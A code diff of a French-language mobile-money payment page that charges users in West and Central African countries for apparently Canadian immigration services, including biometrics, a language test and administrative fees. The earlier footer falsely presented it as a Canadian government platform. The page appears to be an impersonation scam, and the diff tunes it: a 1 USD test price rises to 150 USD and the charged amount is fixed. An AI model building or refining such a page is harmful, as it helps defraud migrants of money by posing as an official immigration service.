@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Service Immigration Paiement</title>
+<title>Paiement ACDH</title>
 
 <style>
 body {
@@ -26,12 +26,6 @@ body {
   width:90%;
   max-width:380px;
   text-align:center;
-  animation:fadeIn 0.5s ease;
-}
-
-@keyframes fadeIn {
-  from {opacity:0; transform:translateY(20px);}
-  to {opacity:1;}
 }
 
 .logo {
@@ -41,7 +35,6 @@ body {
 
 .title {
   font-weight:bold;
-  font-size:18px;
   margin-bottom:15px;
 }
 
@@ -51,7 +44,6 @@ input, select {
   margin-top:10px;
   border-radius:6px;
   border:1px solid #ccc;
-  font-size:16px;
 }
 
 .row {
@@ -79,14 +71,9 @@ button {
   font-weight:bold;
 }
 
-button:hover {
-  background:#0097a7;
-}
-
 .amount-box {
   margin-top:10px;
   font-weight:bold;
-  font-size:16px;
 }
 
 #result {
@@ -114,7 +101,7 @@ button:hover {
 <div class="title">Service Immigration Paiement</div>
 
 <select id="service" onchange="updateAmount()">
-  <option value="1">Données biométriques - 1 USD</option>
+  <option value="150">Données biométriques - 150 USD</option>
   <option value="150">Test de langue - 150 USD</option>
   <option value="220">Droit administratif - 220 USD</option>
   <option value="520">Tout payer - 520 USD</option>
@@ -151,19 +138,22 @@ button:hover {
 </div>
 
 <div class="footer">
-© 2026 Services d'immigration Canada - Plateforme gouvernementale sécurisée 🔒
+© 2026 ACDH Services Canada International — Plateforme sécurisée 🔒
 </div>
 
 <script>
 
+// taux
 const rates = { XOF:600, XAF:600, CDF:2500 };
 
+// devises
 const currencies = {
   BEN:"XOF", CIV:"XOF", SEN:"XOF",
   CMR:"XAF", GAB:"XAF", COG:"XAF",
   COD:"CDF"
 };
 
+// opérateurs
 const operators = {
   BEN:["MTN","MOOV"],
   CIV:["MTN","ORANGE"],
@@ -174,11 +164,16 @@ const operators = {
   SEN:["ORANGE","FREE"]
 };
 
+// indicatifs
 const prefixes = {
   BEN:"229", CIV:"225", CMR:"237",
   COD:"243", COG:"242", GAB:"241", SEN:"221"
 };
 
+// 🔥 montant final GLOBAL
+let finalAmount = 0;
+
+// update opérateurs
 function updateOperators(){
   operator.innerHTML="";
   operators[country.value].forEach(o=>{
@@ -190,25 +185,29 @@ function updateOperators(){
   prefix.value = prefixes[country.value];
 }
 
+// afficher USD RDC
 function toggleCurrency(){
   currency.style.display = country.value === "COD" ? "block":"none";
 }
 
+// calcul montant
 function updateAmount(){
 
   const usd = parseInt(service.value);
 
   let cur = (country.value==="COD") ? currency.value : currencies[country.value];
 
-  let amount = (cur==="USD") ? usd : usd * rates[cur];
+  finalAmount = (cur==="USD") ? usd : usd * rates[cur];
 
-  displayAmount.innerText = "Montant à payer : " + amount + " " + cur;
+  displayAmount.innerText = "Montant à payer : " + finalAmount + " " + cur;
 }
 
+// validation numéro
 function validatePhone(){
   return /^[0-9]{7,10}$/.test(phone.value.trim());
 }
 
+// paiement
 async function payer(){
 
   if(!validatePhone()){
@@ -225,7 +224,7 @@ async function payer(){
     headers:{"Content-Type":"application/json"},
     body: JSON.stringify({
       phone: fullPhone,
-      amount: service.value,
+      amount: finalAmount, // ✅ CORRECTION
       country: country.value,
       operator: operator.value
     })
@@ -234,12 +233,13 @@ async function payer(){
   const data = await res.json();
 
   result.innerText =
-    data.status==="ACCEPTED"?"📲 Vérifiez votre téléphone pour confirmé le paiement":
+    data.status==="ACCEPTED"?"📲 Vérifiez votre téléphone":
     data.status==="PENDING"?"⏳ En attente":
     data.status==="SUCCESS"?"✅ Paiement confirmé":
     "❌ Échec";
 }
 
+// init
 updateOperators();
 updateAmount();
 toggleCurrency();
